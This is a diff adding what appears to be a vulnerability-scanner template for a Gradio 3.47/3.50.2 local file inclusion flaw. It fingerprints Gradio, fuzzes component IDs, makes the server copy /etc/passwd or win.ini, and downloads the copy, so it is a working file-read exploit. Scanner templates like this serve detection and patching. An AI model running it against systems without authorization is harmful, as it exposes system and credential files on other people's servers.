@@ -1,0 +1,89 @@
+flow: http(1) && http(2)
+http:
+- matchers:
+  - condition: or
+    dsl:
+    - contains_any(tolower(body), "content=\"gradio", "gradio_mode", "gradio-app",
+      "https://gradio.app")
+    - contains(tolower(body), "\"method not allowed")
+    internal: true
+    type: dsl
+  raw:
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+  - 'GET /component_server HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+- attack: clusterbomb
+  extractors:
+  - group: 1
+    internal: true
+    name: download_path
+    part: body
+    regex:
+    - '"?([^"]+)'
+    type: regex
+  matchers:
+  - condition: or
+    part: body_2
+    regex:
+    - 'root:.*:0:0:'
+    - \[(font|extension|file)s\]
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    fuzz_component_id: helpers/wordlists/numbers.txt
+    path:
+    - /etc/passwd
+    - c:\\windows\\win.ini
+  raw:
+  - 'POST /component_server HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"component_id": "{{fuzz_component_id}}", "data": "{{path}}", "fn_name": "make_temp_copy_if_needed",
+    "session_hash": "aaaaaaaaaaa"}
+
+    '
+  - 'GET /file={{download_path}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+  stop-at-first-match: true
+id: gradio-component-server-lfi
+info:
+  author: nvn1729
+  classification:
+    cpe: cpe:2.3:a:gradio_project:gradio:*:*:*:*:python:*:*:*
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    epss-percentile: 0.36659
+  description: 'Local file read by calling arbitrary methods of Components class between
+    Gradio versions 3.47 / 3.50.2
+
+    '
+  metadata:
+    max-request: 2
+    product: gradio
+    runzero-review: REJECT/2025-11-07/excluding tag intrusive
+    shodan-query: html:"__gradio_mode__"
+    vendor: gradio_project
+    verified: true
+  name: Gradio 3.47/3.50.2 - Local File Inclusion
+  reference:
+  - https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2
+  - https://www.horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/
+  severity: high
+  tags: cve,cve2024,gradio,intrusive,lfi,lfr,unauth,vuln
